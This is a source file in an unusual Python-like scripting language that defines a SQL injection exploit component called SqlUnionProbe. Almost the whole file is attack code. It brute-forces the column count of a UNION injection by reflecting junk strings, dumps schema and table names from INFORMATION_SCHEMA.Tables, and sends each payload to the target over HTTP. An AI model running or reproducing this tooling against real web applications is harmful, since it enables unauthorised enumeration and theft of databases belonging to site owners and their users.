#'SqlUnionInfo';
#'SqlDatabaseInfo';

class init ExploitComponent SqlUnionProbe {
    emitter: SqlEmitter(),
    
    __init__: @(httpTemplate, maxColumns = 0x20) { },
    
    findOutput: @{
        self.emitter = SqlEmitter();
        columns = 0;
        
        while (true) {
            columns++;
            
            cols = range(0, columns)
                @select(@(x) self.emitter.junkString());
                
            quote = cols[0][0];
            
            colVals = cols 
                @select(@(x) x.lstrip(quote).rstrip(quote));
                
            resp = cols 
            |> self.createInjection 
            |> self.sendRequest;
            
            matches = colVals @where(resp.__contains__);
            
            if (matches |> len @!= 0) {
                offset = colVals.index(matches[0]);
                
                msg = '[+] Output found: Columns={}, Offset={}\r\n'
                    .format(columns, offset);
                    
                self.log(msg);
                ret SqlUnionInfo(columns, offset);
            }
            
            if (columns >= self.maxColumns) ret -1;
        }
    },
    
    listSchemas: @{
        colCount = self.findOutput();
        
        injector = SqlUnionInjector(
            { HOST: 'localhost', PORT: 80 },
            colCount.columnCount,
            colCount.outputColumn,
            [ 'TABLE_SCHEMA', 'TABLE_NAME' ],
            'INFORMATION_SCHEMA.Tables');
        
        injector.payload = injector.dump;            
        resp = injector.str() |> self.sendRequest;
        results = injector.finalize(resp);
        
        ret SqlDatabaseInfo(results);
    },
    
    sendRequest: @(injection) {
        values = { sqli: injection };
        get = self.httpTemplate.getUrl(values);
        self.log('[?] %s\r\n' % get);
        post = self.httpTemplate.getPost(values);
        resp = urllib2.urlopen(get, post).read();
        
        ret resp;
    },
    
    createInjection: @(cols) Injection(
        self.emitter.quote(),
        self.emitter.comment(),
        @() self.emitter.unionAll(cols)),
};